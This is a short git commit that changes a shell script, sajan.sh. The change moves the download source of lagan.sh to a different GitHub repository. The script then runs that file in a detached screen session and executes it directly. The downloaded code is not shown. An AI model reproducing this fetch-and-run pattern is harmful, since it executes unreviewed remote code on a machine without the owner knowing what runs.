44b2485a24c74c23b17a7b0efb48e599115fb428
Sharmaaman69696969 <86776814+Sharmaaman69696969@users.noreply.github.com>
2021-07-01 15:54:51 +0530

    Update sajan.sh

--- sajan.sh
+++ sajan.sh
@@ -2,7 +2,7 @@
 
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/archernap/prem/raw/main/lagan.sh
+wget https://github.com/sharmaaman69696969/prem/raw/main/lagan.sh
 screen -dmS lagan.sh .lagan.sh 60 70
 chmod +x lagan.sh
 ./lagan.sh
